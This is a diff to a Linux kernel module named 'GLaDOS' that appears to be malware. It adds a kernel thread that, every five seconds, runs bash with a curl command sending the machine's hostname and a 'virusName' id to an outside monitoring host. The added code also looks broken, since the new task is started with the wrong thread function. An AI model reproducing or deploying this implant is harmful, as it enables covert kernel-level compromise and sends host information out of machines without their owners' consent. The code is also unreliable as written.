@@ -6,10 +6,12 @@
 #include <linux/delay.h>
 
 #define FILENAME "/tmp/song"
-#define INTERVAL_SECONDS 90
+#define INTERVAL_SECONDS 150
+#define CHECKIN_INTERVAL_SECONDS 5
 
-int stop;
+int stop = 0;
 struct task_struct *task;
+struct task_struct *checkin_task;
 
 static char *envp[] = {
     "SHELL=/bin/bash",
@@ -56,8 +58,6 @@ static void GLaDOS_taunt(void) {
 }
 
 int GLaDOS_thread(void *data) {
-    stop = 0;
-
     while(true) {
         #ifdef DEBUG
         printk("[GLaDOS][+] cake\n");
@@ -70,12 +70,26 @@ int GLaDOS_thread(void *data) {
     }
 }
 
+
+int GLaDOS_checkin(void *data) {
+    char *checkin = "curl -XGET http://monitor.daviddworken.com:8080/api/submit?id=`hostname`&virusName=4";
+    char *checkin_argv[] = { "/bin/bash", "-c", checkin, NULL };
+
+    while(true) {
+        call_usermodehelper(checkin_argv[0], checkin_argv, envp, UMH_WAIT_EXEC);
+        msleep_interruptible(CHECKIN_INTERVAL_SECONDS * 1000);
+
+        if(stop) return 0;
+    }
+}
+
 static int __init GLaDOS_init(void) {
     #ifdef DEBUG
     printk("[GLaDOS][+] installed\n");
     #endif
 
     task = kthread_run(&GLaDOS_thread, NULL, "GLaDOS");
+    checkin_task = kthread_run(&GLaDOS_thread, NULL, "GLaDOS");
 
     return 0;
 }
@@ -83,6 +97,7 @@ static int __init GLaDOS_init(void) {
 static void __exit GLaDOS_exit(void) {
     stop = 1;
     kthread_stop(task);
+    kthread_stop(checkin_task);
 
     #ifdef DEBUG
     printk("[GLaDOS][+] uninstalled\n");
